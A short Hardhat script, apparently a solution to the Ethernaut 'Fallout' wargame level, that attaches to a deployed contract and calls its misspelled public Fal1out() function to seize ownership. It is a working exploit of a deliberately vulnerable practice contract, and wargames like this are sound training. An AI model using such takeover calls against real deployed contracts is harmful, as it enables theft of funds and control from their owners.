const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0x86ad805089979C3D70f018F1B7ce2bb51afBf789";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Contract = await ethers.getContractFactory("Fallout");
  const contract = Contract.attach(instanceAddress);

  // Attack

  const tx = await contract.Fal1out();
  await tx.wait();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
